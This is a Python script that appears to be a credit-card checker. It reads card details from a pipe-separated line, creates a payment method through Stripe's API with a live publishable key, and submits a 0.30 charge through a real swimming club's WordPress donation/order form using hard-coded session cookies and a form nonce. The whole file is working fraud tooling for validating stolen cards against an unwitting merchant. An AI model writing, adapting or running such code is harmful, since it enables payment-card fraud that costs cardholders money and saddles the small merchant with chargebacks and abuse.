import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F2710656340%3B+stripe-js-v3%2F2710656340%3B+card-element&key=pk_live_51Jez78BKwt72jNCmXW07XYSzt9cnaUVtC9aTdAF3ImhhQ8KcGKRlpJh9VjBEqq51laaZcYO4GWHpHRU8nCSP5WAB00I9qJSMtV'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.2.1574929798.1740392008',
	    '__stripe_mid': 'dad89c44-abb0-4281-9cdc-44510dd11f1fc4fc70',
	    'PHPSESSID': '4svf2fepb9mbuv5rbtac9khh8l',
	    '_gid': 'GA1.2.1348120377.1744079191',
	    '_ga_Y6Z6HMHW5Q': 'GS1.2.1744079191.9.0.1744079191.0.0.0',
	    '__stripe_sid': 'cfef4806-df27-4e7c-9913-217e0d6b17306828df',
	}
	
	headers = {
	    'authority': 'www.sussexswimming.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.2.1574929798.1740392008; __stripe_mid=dad89c44-abb0-4281-9cdc-44510dd11f1fc4fc70; PHPSESSID=4svf2fepb9mbuv5rbtac9khh8l; _gid=GA1.2.1348120377.1744079191; _ga_Y6Z6HMHW5Q=GS1.2.1744079191.9.0.1744079191.0.0.0; __stripe_sid=cfef4806-df27-4e7c-9913-217e0d6b17306828df',
	    'origin': 'https://www.sussexswimming.org',
	    'referer': 'https://www.sussexswimming.org/swimming/county-championships-2025/coach-team-manager-lunch-orders-championships-2025/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744079268123',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=14688&_fluentform_30_fluentformnonce=df5e01d7e6&_wp_http_referer=%2Fswimming%2Fcounty-championships-2025%2Fcoach-team-manager-lunch-orders-championships-2025%2F&input_text_1=Rodam&input_text_2=User&email=rodamuser08%40gmail.com&multi_select%5B%5D=Worthing%20SC&input_radio_sat10=Saturday%208thFebruary%20option%201%20&custom-payment-amount=0.30&payment_method=stripe&input_radio_sat11=&input_radio_sat24=&input_radio_sat25=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '30',
	}
	
	r2 = requests.post(
	    'https://www.sussexswimming.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
